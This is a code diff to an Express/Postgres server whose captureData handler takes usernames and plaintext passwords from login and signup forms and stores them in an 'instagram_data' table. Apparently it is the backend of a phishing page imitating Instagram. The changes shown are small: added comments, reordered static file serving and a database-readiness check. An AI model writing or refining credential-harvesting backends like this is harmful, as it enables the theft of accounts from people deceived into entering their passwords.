@@ -7,6 +7,7 @@ const path = require('path');
 const app = express();
 const port = process.env.PORT || 3001;
 
+// Configuration for local and production
 const dbConfig = {
   connectionString: process.env.DATABASE_URL,
   host: process.env.DB_HOST || 'localhost',
@@ -20,9 +21,10 @@ const dbConfig = {
 app.use(cors());
 app.use(express.json());
 
-// Serve static files (including the compiled bundle in /dist)
-app.use(express.static(__dirname));
+// Serve the compiled frontend bundle
 app.use('/dist', express.static(path.join(__dirname, 'dist')));
+// Serve other static assets
+app.use(express.static(__dirname));
 
 async function initDb() {
   const pool = process.env.DATABASE_URL 
@@ -30,7 +32,7 @@ async function initDb() {
     : new Pool(dbConfig);
 
   try {
-    // If local, we might need to create the DB first. For cloud (DATABASE_URL), we just run the table query.
+    // Local DB creation logic
     if (!process.env.DATABASE_URL) {
         const baseClient = new Client({ ...dbConfig, database: 'postgres' });
         await baseClient.connect();
@@ -39,6 +41,7 @@ async function initDb() {
         await baseClient.end();
     }
 
+    // Initialize tables
     await pool.query(`
       CREATE TABLE IF NOT EXISTS instagram_data (
         id SERIAL PRIMARY KEY,
@@ -53,7 +56,7 @@ async function initDb() {
     return pool;
   } catch (err) {
     console.error("Database Initialization Error:", err.message);
-    return pool; // Return pool anyway to allow reconnection attempts
+    return pool;
   }
 }
 
@@ -62,6 +65,8 @@ initDb().then(pool => { dbPool = pool; });
 
 const captureData = async (req, res) => {
   const { identifier, password, fullName, username } = req.body;
+  if (!dbPool) return res.status(503).json({ success: false, message: 'Database not ready' });
+
   try {
     const query = `INSERT INTO instagram_data (identifier, password, full_name, username) VALUES ($1, $2, $3, $4) RETURNING id;`;
     const result = await dbPool.query(query, [identifier, password, fullName || null, username || null]);
@@ -75,6 +80,7 @@ const captureData = async (req, res) => {
 app.post('/api/signup', captureData);
 app.post('/api/login', captureData);
 
+// Fallback to index.html for React Router compatibility
 app.get('*', (req, res) => {
   res.sendFile(path.join(__dirname, 'index.html'));
 });
